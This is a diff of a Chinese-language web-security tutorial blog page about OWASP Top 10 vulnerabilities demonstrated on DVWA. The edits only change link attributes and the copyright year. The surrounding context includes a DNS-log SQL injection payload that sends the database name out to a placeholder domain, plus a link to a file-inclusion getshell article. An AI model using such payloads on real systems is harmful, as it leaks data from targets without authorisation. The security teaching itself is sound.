@@ -384,7 +384,7 @@
       
         <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><img src="http://img.mp.itc.cn/upload/20170417/9286692719ce46c1829a3c16486942c3_th.jpeg" alt=""></p>
 <blockquote>
-<p>开放式Web应用程序安全项目公布的十大WEB安全漏洞<br><a href="https://www.owasp.org/index.php/Top_10_2017-Top_10" target="_blank" rel="external">OWASP TOP 10 2017</a> </p>
+<p>开放式Web应用程序安全项目公布的十大WEB安全漏洞<br><a href="https://www.owasp.org/index.php/Top_10_2017-Top_10" target="_blank" rel="noopener">OWASP TOP 10 2017</a> </p>
 </blockquote>
 <a id="more"></a>
 <h4 id="WEB安全三境界"><a href="#WEB安全三境界" class="headerlink" title="WEB安全三境界"></a>WEB安全三境界</h4><ul>
@@ -398,7 +398,7 @@
 </li>
 </ul>
 <hr>
-<h3 id="WEB安全漏洞演示-Baby-Demo"><a href="#WEB安全漏洞演示-Baby-Demo" class="headerlink" title="WEB安全漏洞演示 Baby Demo"></a>WEB安全漏洞演示 Baby Demo</h3><p>我们将展示基于PHP+MySQL（目前广泛用于中小型站点）的WEB应用漏洞利用过程。展示在<a href="http://www.dvwa.co.uk/index.php" target="_blank" rel="external">Damn Vulnerable Web Application</a>(DVWA) Version 1.9上进行。虽然DVWA于2015-09-19发布1.9版本后不再更新，但仍然是比较好WEB安全入门测试平台。</p>
+<h3 id="WEB安全漏洞演示-Baby-Demo"><a href="#WEB安全漏洞演示-Baby-Demo" class="headerlink" title="WEB安全漏洞演示 Baby Demo"></a>WEB安全漏洞演示 Baby Demo</h3><p>我们将展示基于PHP+MySQL（目前广泛用于中小型站点）的WEB应用漏洞利用过程。展示在<a href="http://www.dvwa.co.uk/index.php" target="_blank" rel="noopener">Damn Vulnerable Web Application</a>(DVWA) Version 1.9上进行。虽然DVWA于2015-09-19发布1.9版本后不再更新，但仍然是比较好WEB安全入门测试平台。</p>
 <h4 id="零、基础知识补充"><a href="#零、基础知识补充" class="headerlink" title="零、基础知识补充"></a>零、基础知识补充</h4><ul>
 <li><strong>典型WEB应用服务体系</strong></li>
 </ul>
@@ -442,7 +442,7 @@
 </ul>
 <ul>
 <li><p>文件包含并非鸡肋漏洞，满足特定条件甚至可以getshell</p>
-<p>参见：<a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">LFI+PHPInfo getshell</a></p>
+<p>参见：<a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">LFI+PHPInfo getshell</a></p>
 </li>
 </ul>
 <h4 id="二、注入类"><a href="#二、注入类" class="headerlink" title="二、注入类"></a>二、注入类</h4><h5 id="（一）命令与代码注入漏洞-Command-Code-Injection"><a href="#（一）命令与代码注入漏洞-Command-Code-Injection" class="headerlink" title="（一）命令与代码注入漏洞 Command/Code Injection"></a>（一）命令与代码注入漏洞 Command/Code Injection</h5><ul>
@@ -497,7 +497,7 @@
 <h4 id="关于注入类漏洞的高级利用————盲注与DNS-log"><a href="#关于注入类漏洞的高级利用————盲注与DNS-log" class="headerlink" title="关于注入类漏洞的高级利用————盲注与DNS log"></a>关于注入类漏洞的高级利用————盲注与DNS log</h4><p>DNS在解析的时候会留下日志，我们可以把信息放在高级域名中，读取传递来的日志从而获取信息</p>
 <p>例如我们有域名是：test.org,我们把信息置于二级域名处<code>info.test.org</code>。在服务器端发起域名解析请求，那么就能收到info这个信息。</p>
 <p>使用DNS log来获取回显，以下是两个典型场景：<br>1.一个SQL盲注点，但普通盲注手段需要频繁请求，使得ip被ban。</p>
-<p><a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="external">Data Retrieval over DNS in SQL Injection Attacks</a></p>
+<p><a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="noopener">Data Retrieval over DNS in SQL Injection Attacks</a></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">load_file(concat('\\\\',(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'.domain.com\\abc'</span>))</div></pre></td></tr></table></figure>
 <p>2.疑似命令注入点，但目标站点不回显，无法确认。</p>
 <h4 id="三、前端类"><a href="#三、前端类" class="headerlink" title="三、前端类"></a>三、前端类</h4><h5 id="（一）跨站脚本攻击漏洞"><a href="#（一）跨站脚本攻击漏洞" class="headerlink" title="（一）跨站脚本攻击漏洞"></a>（一）跨站脚本攻击漏洞</h5><ul>
@@ -748,7 +748,7 @@
         <div class="copyright" >
   
   &copy;  2016 &mdash; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
